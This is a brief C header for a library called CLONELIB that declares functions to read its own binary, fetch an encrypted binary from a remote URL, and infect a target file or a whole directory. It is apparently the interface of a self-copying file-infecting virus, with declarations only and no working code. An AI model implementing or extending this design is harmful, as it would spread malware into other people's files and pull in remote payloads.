#ifndef HEADER_CLONELIB
	#define HEADER_CLONELIB
	#include <stdbool.h>
	
	//Gets own binary
	unsigned int getOwnBytes(char**,const char*);
	
	//Get remote binary, in encrypted form
	unsigned int getRemoteBytes(char** decrypted_msg, const char* url);

	//Infects a target file
	bool infectTarget(const char*, const char*, unsigned int);
	bool infectDirectory(const char*, const char*);
#endif
